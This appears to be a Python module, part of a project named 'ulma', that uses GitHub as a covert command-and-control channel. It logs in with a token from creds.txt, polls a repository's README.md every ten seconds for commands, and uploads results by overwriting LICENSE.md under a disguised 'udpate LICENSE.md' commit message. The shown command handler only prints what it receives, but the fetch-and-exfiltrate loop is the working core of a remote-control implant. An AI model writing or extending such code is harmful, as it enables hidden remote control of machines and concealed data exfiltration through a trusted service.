from __future__ import absolute_import
from __future__ import print_function

import github3

from ulma.utils import Utils
from time import sleep

class Endpoint:

    def __init__(self):
        self.last_command = None
        self.user = None
        self.repo = None
        self.utils = Utils()
        self.set_endpoint()

    def set_endpoint(self):
        if self.utils.get_mode() == "online":    
            with open("creds.txt", "r") as f:
                content = f.readlines()[0]

            self.user = content.split(":")[0]
            token = content.split(":")[1]
            self.endpoint = github3.login(self.user, token)

        else:
            self.endpoint = None
    
    def get_repo(self):
        if self.endpoint is not None:
            self.repo = self.endpoint.repository(self.user, "command")
        else:
            self.set_endpoint()
            return "Error: can't connect to Internet."
    
    def handle_command(self, command):
        if command != self.last_command:
            self.last_command = command
            print("Command actuelle: ", command)
    
    def receive_command(self):
        while True:
            if self.repo is not None:
                command = self.repo.file_contents("README.md").decoded.decode('utf-8').strip("\n")
                self.handle_command(command)
            else:
                self.get_repo()

            sleep(10)

    def upload_result(self, result):
        if self.repo is not None:
            self.repo.file_contents("LICENSE.md").update('udpate LICENSE.md', result.encode('utf-8'))